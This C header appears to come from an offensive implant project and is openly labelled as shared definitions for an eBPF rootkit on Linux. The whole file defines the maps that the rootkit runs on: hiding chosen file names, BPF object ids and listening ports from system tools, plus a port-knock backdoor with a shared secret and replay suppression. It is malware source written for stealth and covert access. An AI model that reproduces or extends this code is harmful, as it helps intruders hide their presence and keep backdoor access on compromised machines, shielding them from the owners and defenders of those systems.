// common.h — shared definitions for the linux_agent eBPF rootkit (Phase 2)
//
// All modules share the map layout below so ONE loader BOF can create the
// full map set and attach every program. Map ids are pinned in the object
// (maps named by the loader) — see ebpf_load.c.
#ifndef AX_BPF_COMMON_H
#define AX_BPF_COMMON_H

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

#define AX_KNOCK_PORT     54321   // magic TCP window value (Knock)
#define AX_RINGBUF_SZ     (1 << 16)

// ── Maps (created by the loader BOF; sections only mark the intent) ──

// hide_names: hash<name[64], u8> — getdents64 entries with these names vanish
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 32);
    __type(key, char[64]);
    __type(value, __u8);
} hide_names SEC(".maps");

// hidden_bpf_ids: hash<u32, u8> — bpf object ids to hide from GET_FD_BY_ID
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key, __u32);
    __type(value, __u8);
} hidden_bpf_ids SEC(".maps");

// knock_key: array<1, u8[16]> — shared secret for the Knock token
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, unsigned char[16]);
} knock_key SEC(".maps");

// knock_seen: lru_hash<u32, u8> — replay suppression (token timestamps)
struct {
    __uint(type, BPF_MAP_TYPE_LRU_PERCPU_HASH);
    __uint(max_entries, 1024);
    __type(key, __u32);
    __type(value, __u8);
} knock_seen SEC(".maps");

// events: ringbuf — rootkit→userland events (Knock activation, …)
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, AX_RINGBUF_SZ);
} events SEC(".maps");

// hidden_ports: hash<u16, u8> — listening ports to remove from /proc/net/tcp
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key, __u16);
    __type(value, __u8);
} hidden_ports SEC(".maps");

// ── Event wire format (ringbuf payloads) ──
struct ax_event {
    __u32 type;      // 1 = knock activated
    __u32 value;
    char  msg[64];
};

enum {
    AX_EVT_KNOCK = 1,
};

#endif /* AX_BPF_COMMON_H */
